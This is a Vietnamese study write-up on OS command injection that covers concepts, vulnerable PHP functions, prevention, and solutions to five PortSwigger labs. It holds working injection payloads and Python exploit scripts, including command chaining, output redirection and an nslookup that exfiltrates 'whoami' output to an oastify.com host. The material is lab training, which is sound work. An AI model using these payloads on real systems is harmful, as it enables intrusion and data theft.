# OS command injection

## Khái niệm & Khai thác & Tác hại & Phòng tránh

<ul>
    <b>Khái niệm</b>
    <ul>
        <li>OS Command Injection (hay còn được gọi là shell injection) là một lỗ hổng bảo mật web cho phép kẻ tấn công thực thi các lệnh hệ điều hành (OS) tùy ý trên máy chủ đang chạy service nào đó. Kẻ tấn công có thể tận dụng lỗ hổng này để khai thác, lấy thông tin, chuyển cuộc tấn công sang hệ thống khác bên trong tổ chức</li>
        <li>Một ví dụ đơn giản về command injection có thể xảy ra trong một trang web có tính năng tìm kiếm. Nếu ứng dụng web không kiểm tra và xử lý đúng cách dữ liệu nhập từ người dùng, người tấn công có thể chèn các lệnh hệ thống vào trường tìm kiếm để thực hiện các hành động không được phép.</li>
    </ul>
    <b>Khai thác</b>
    <ul>
        <b>Blind OS command injection</b>
        <li>Nhiều trường hợp OS command injection là blind vulnerabilities. Có nghĩa là đầu ra sẽ không trả về trong response và ouput sẽ không hiển thị trên màn hình (hay còn gọi là 1 lỗ hổng tàng hình).</li>
        <ul>
            <li>Detecting blind OS command injection using time delays(Sử dụng time delays để xác định được blind vulnerabilities)
            VD: <pre>& ping -c 10 127.0.0.1 &
// Nếu trong 10s có phản hồi liên tục từ response thì thành công, còn ngược lại thì không thành công.
</pre>
                </li>
            <li>Exploiting blind OS command injection by redirecting output(Có nghĩa là khai thác lỗ hổng OS command bằng cách chuyển hướng đầu ra) VD: <pre>&whoami > /var/www/static/whoami.txt & 
</pre>Rồi sau đó chúng ta có thể sử dụng browser truy cập vào http://url/whoami.txt để truy xuất tệp và xem output từ lệnh được inject vào.</li>
        </ul>
        <li>dùng các ký tự: <pre>$, `, Newline (0x0a or \n), ;, ||, |, &&, &</pre></li>
    </ul>
    <b>Tác hại</b>
     <ul>
        <li>Thông thường, kẻ tấn công có thể tận dụng lỗ hổng này để xâm phạm vào các phần khác của cơ sở hạ tầng lưu trữ, khai thác, lấy thông tin và có thể chuyển cuộc tấn công sang hệ thống khác bên trong tổ chức.</li>
    </ul>
    <b>Phòng tránh</b>
     <ul>
        <li>Cách hiệu quả nhất để ngăn ngừa command injection là không dùng command nữa. Tức là không bao giờ gọi ra các lệnh OS từ lớp ứng dụng. Trong các trường hợp, có nhiều cách khác nhau để thực hiện chức năng cần thiết bằng cách sử dụng API trên nền tảng an toàn hơn. Nếu không thể tránh khỏi việc sử dụng các lệnh OS thì phải thực hiện xác thực đầu vào mạnh</li>
         <li>Validate các giá trị được phép dựa trên whitelist.</li>
        <li>Chỉ chấp nhận đầu vào chỉ có ký tự chữ và số, không có ký tự đặc biệt, khoảng trắng,...</li>
    </ul>
</ul>

![image](https://hackmd.io/_uploads/SJqxFO9KT.png)

Để hiểu rõ hơn về kiểu tấn công này, trong bài viết này tôi sẽ so sánh các đặc điểm giữa **Code injection và Command injection**.

| Code injection                                                                                         | Command injection                                                                                              |
| ------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------- |
| Thuật ngữ chỉ chung các cuộc tấn công chèn code thực thi vào mục tiêu                                  | Chỉ cụ thể việc thực thi các lệnh shell (OS) tương ứng với hệ điều hành tại hệ thống                           |
| Payload inject có thể là bất kỳ ngôn ngữ nào như **php, Ruby, Python**, ...                            | Payload inject là các lệnh shell như **id, whoami, ls**, ... và có thể thay đổi với tùy hệ điều hành khác nhau |
| Kẻ tấn công phần lớn có đặc quyền là **root/admin** do mã nguồn thường được thực thi với đặc quyền cao | Kẻ tấn công có đặc quyền của ứng dụng bị xâm nhập, ví dụ với ứng dụng web thường mang đặc quyền **www-data**   |

| Câu lệnh     | Ý nghĩa                                                                                                               |
| ------------ | --------------------------------------------------------------------------------------------------------------------- |
| cmd1\|cmd2   | Kết quả của cmd1 trở thành tham số truyền vào của cmd2, dù cmd1 thực thi thành công hay thất bại đều sẽ thực thi cmd2 |
| cmd1\|\|cmd2 | cmd1 thực thi thất bại thì cmd2 mới thực thi                                                                          |
| cmd1;cmd2    | cmd1 thực thi thành công hay thất bại đều sẽ thực thi cmd2                                                            |
| cmd1&cmd2    | cmd1 thực thi tại background, cmd1 và cmd2 đồng thời thực thi                                                         |

<b>Một số hàm có thể dẫn tới OS command injection trong PHP</b>

<li>Hàm system(): <pre>system(string $command, int &$result_code = null)</pre> VD: <pre>if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    system($cmd);
}
</pre></li>
<li>Hàm exec(): <pre>Cú pháp: exec(string $command, array &$output = null, int &$result_code = null)</pre> Thực thi lệnh $command. Nếu có biến $output sẽ lưu kết quả vào $output dưới dạng mảng VD: <pre>$output = null;
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    exec($cmd, $output);
    var_dump($output);
}
</pre></li>
<li>Hàm passthru(): <pre>Cú pháp: passthru(string $command, int &$result_code = null)</pre> VD: <pre>if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    passthru($cmd);
}
</pre></li>
<li>Hàm shell_exec(): <pre>Cú pháp: shell_exec(string $command)</pre> VD: <pre>if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo $output;
}
</pre></li>

với Python

<li>
<pre>Hàm system()
Cú pháp: system(command)

Hàm popen()
Cú pháp: popen(cmd, mode='r', buffering=-1)

Hàm subprocess.call()/subprocess.run()</pre></li>

<li><pre> Ngôn ngữ Java
Cần chú ý java.lang.Runtime.getRuntime().exec(command)</pre></li>

### prevent

#### Giai đoạn đang phát triển

- Nếu thực hiện OS command có lỗi thì không dùng command nữa là xong :v (nghĩa là không bao giờ gọi OS command từ lớp ứng dụng).
- Trong các trường hợp, có nhiều cách khác nhau để thực hiện chức năng cần thiết bằng cách sử dụng API trên nền tảng an toàn hơn. Nếu không thể tránh khỏi việc sử dụng các lệnh OS thì phải thực hiện xác thực đầu vào mạnh.

#### Giai đoạn release

- Nếu đã fix được hầu hết các bug OS Command Injection ở giai đoạn phát triển thì chúng ta sẽ cần 1 lớp phòng thủ nữa ở giai đoạn Release, đó là WAF (Web Application Firewall)

## 1. Lab: OS command injection, simple case

link: https://portswigger.net/web-security/os-command-injection/lab-simple

### Đề bài

![image](https://hackmd.io/_uploads/SkgWGO5Y6.png)

### Phân tích

<ul>
    <li>bài lab chứa 1 lỗ hổng OS command trong mục product stock checker.Chương trình thực thi 1 shell yêu cầu do người dùng cung cấp và trả về output trong yêu cầu phản hồi. Để solve bài lab, thực thi lệnh whoami  để xác định tên người dùng.</li>
    <li>Mình sẽ sử dụng Burp suite để chạy và bắt trang có địa chỉ POST /product/stock  để lấy ID sản phẩm và ID cửa hàng vì đây là phần có thể thay đổi và mình có thể chèn shell được</li>
</ul>

![image](https://hackmd.io/_uploads/SJhMgFqY6.png)

![image](https://hackmd.io/_uploads/rkMzxKqKa.png)

### Khai thác

![image](https://hackmd.io/_uploads/SJyLgYcY6.png)

có lẽ lệnh whoami đã chuyền sai tham số và nó báo lại cho mình kết quả --help để tìm hiểu

có lẽ lệnh kiểm tra sản phẩm tồn kho sẽ gồm 2 tham số thế này

```
kiem_tra 1 1
```

và mình nhập `;whoami` vào sẽ thế này và trả về kết quả lỗi như trên

```
kiem_tra ;whoami 1
```

mình ngắt lệnh `kiem_tra` và lúc này hệ thống thực hiện lệnh `whoami 1` và bị lỗi

![image](https://hackmd.io/_uploads/rk51GF9Yp.png)

mình thực hiện:

```
productId=1&storeId=1;whoami
```

và sẽ trả về số sản phẩm qua lệnh kiem_tra tồn kho cùng user qua lệnh `whoami`

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0acd009404c32e4f8077763200e40017.web-security-academy.net'

session = requests.Session()

data = 'productId=1&storeId=1;whoami'

response = requests.post(
    url + '/product/stock',
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/B1xvmFcFp.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/rJcweF5Yp.png)

## 2. Lab: Blind OS command injection with time delays

link: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

### Đề bài

![image](https://hackmd.io/_uploads/BkygSjqKa.png)

### Phân tích

<ul>
    <li>Bài này cũng tương tự như bài trước, tuy nhiên có lỗi ở mục feedback, và để solve bài lab hãy khai thác lỗi blind os command để gây ra độ trễ 10s.</li>
    <li>Cũng giống bài trước, mình vẫn dùng burp suite để bắt trang feedback</li>
</ul>

![image](https://hackmd.io/_uploads/By-X8jcYT.png)

![image](https://hackmd.io/_uploads/B1VMIi9t6.png)

chúng ta cần thực hiện Blind OS command injection bằng cách nhận biết độ delay của gói tin response = 10

### Khai thác

mình đã thực hiện lệnh ping đến localhost vs 10 gói tin ICMP

```
ping${IFS}-c${IFS}10${IFS}127.0.0.1
```

trong đó mặc định khi không có giá trị sẽ là khoảng trắng

![image](https://hackmd.io/_uploads/HycJOjct6.png)

và sau 10 giây mình thấy gói tin mới phản hồi

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
from datetime import datetime

url = 'https://0a7e002004ee7302816d61fe0071006c.web-security-academy.net'

session = requests.Session()

cookies = {
    'session': '5fxpKOoeqMtHkgehCwNiHIChS3joOhi1',
}

send_post = datetime.now()
t1=send_post.strftime("%H:%M:%S")
print(t1)

data = {
    'csrf': 'rLqCvxqOBdoSCiM6tlZf5LY2mcicEUFN',
    'name': 'cuong',
    'email': 'abc%40gmail.com;ping${IFS}-c${IFS}10${IFS}127.0.0.1;',
    'subject': 'abc',
    'message': 'abc',
}

response = requests.post(
    url + '/feedback/submit',
     cookies=cookies,
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
receive_post=datetime.now()
t2=receive_post.strftime("%H:%M:%S")
print(t2)
print("time: ", receive_post-send_post)
```

![image](https://hackmd.io/_uploads/rJhqnicKa.png)

mục đích của chúng ta đã được thực hiện và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/BJ_Z_j9YT.png)

## 3. Lab: Blind OS command injection with output redirection

link: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

### Đề bài

![image](https://hackmd.io/_uploads/rkKYTiqK6.png)

### Phân tích

<ul>
    <li>Đây lại là một dạng Blind OS Command Injection. Lần này ta sẽ ghi output của command vào 1 file thuộc folder mà user hiện tại có quyền ghi w, đó là /var/www/images/. Thư mục này chính là nơi chứa các ảnh mà ứng dụng load cho các posts thông qua param filename.</li>
    <li>Đầu tiên ta vẫn vào mục feedback và gửi đi thông tin sau đó tiếp tục dùng burp suite để bắt trang feedback/submit.</li>
</ul>

![image](https://hackmd.io/_uploads/rkBo0j9Yp.png)

### Khai thác

Sau đó ta sẽ thay đổi nội dung email với payload sau:

```
email=abc%40gmail.com;whoami>/var/www/images/whoami${IFS}||${IFS}
```

<li>Lệnh whoami>/var/www/images/output.txt là một lệnh dòng lệnh trong hệ điều hành Unix/Linux, được sử dụng để ghi đầu ra của lệnh whoami vào tệp tin có đường dẫn /var/www/images/whoami</li>

![image](https://hackmd.io/_uploads/rJILz25KT.png)

<li>Mình sẽ bắt URL khác của 1 file hình ảnh và sửa filename thành whoami</li>

![image](https://hackmd.io/_uploads/SJuTf39Kp.png)

<li>Truy cập đường dẫn load ảnh với filename=whoami, lúc này nội dùng file /var/www/images/whoami được trả về.
</li>

![image](https://hackmd.io/_uploads/B1eM72qFp.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0aa600da03273e0b8096b7b000ff0037.web-security-academy.net'

# session = requests.Session()

res = requests.get(
    url + '/feedback',
    verify=False,
)

soup = BeautifulSoup(res.text, 'html.parser')
session = res.cookies.get('session')
csrf_token = soup.find('input', {'name': 'csrf'})['value']
print("session: ", session)
print("csrf: ", csrf_token)

cookies = {
    'session': session,
}

data = {
    'csrf': csrf_token,
    'name': 'cuong',
    'email': 'abc%40gmail.com;whoami>/var/www/images/whoami${IFS}||${IFS}',
    'subject': 'abc',
    'message': 'abc',
}

response = requests.post(
    url + '/feedback/submit',
    cookies=cookies,
    data=data,
    verify=False,
)

params = {
    'filename': 'whoami'
}

response = requests.get(
    url + '/image',
    params=params,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/rJOmwh5Y6.png)

mục đích của chúng ta đã được thực hiện và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HkT7Qh9Kp.png)

## 4.Lab: Blind OS command injection with out-of-band interaction

link: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

### Đề bài

![image](https://hackmd.io/_uploads/rJVkFjE_R.png)

### Phân tích

- Ứng dụng thực thi lệnh shell chứa thông tin chi tiết do người dùng cung cấp. Lệnh được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Không thể chuyển hướng đầu ra vào vị trí mà bạn có thể truy cập. Tuy nhiên, bạn có thể kích hoạt tương tác ngoài băng tần với miền bên ngoài.

### Khai thác

![image](https://hackmd.io/_uploads/SJ4R1hNuR.png)

- thực hiện nslookup truy vấn đến burpcolabrator của chúng ta

`;nslookup+wbbx198pcmvu9iw4z7r37e7n2e85wvkk.oastify.com;`

![image](https://hackmd.io/_uploads/rJK5ln4uA.png)

![image](https://hackmd.io/_uploads/Byzox3NuC.png)

![image](https://hackmd.io/_uploads/Bk-3gnEdC.png)

## 5. Lab: Blind OS command injection with out-of-band data exfiltration

link: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

### Đề bài

![image](https://hackmd.io/_uploads/Hkw8-3VOA.png)

### Phân tích

- Ứng dụng thực thi lệnh shell chứa thông tin chi tiết do người dùng cung cấp. Lệnh được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Không thể chuyển hướng đầu ra vào vị trí mà bạn có thể truy cập. Tuy nhiên, bạn có thể kích hoạt tương tác ngoài băng tần với miền bên ngoài.

Để giải bài lab, hãy thực hiện whoamilệnh và trích xuất đầu ra thông qua truy vấn DNS tới Burp Collaborator. Bạn sẽ cần nhập tên người dùng hiện tại để hoàn thành bài lab.

### Khai thác

- thực hiện nslookup truy vấn đến burpcolabrator của chúng ta với kết quả của lệnh được thực thi whoami

`` ;nslookup+`whoami`.cgwd6pd5h20aey1k4nwjcuc37udl1cp1.oastify.com; ``

![image](https://hackmd.io/_uploads/rJz0f2Ed0.png)

![image](https://hackmd.io/_uploads/B1ZTG3E_A.png)

![image](https://hackmd.io/_uploads/S14hf2VdA.png)

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
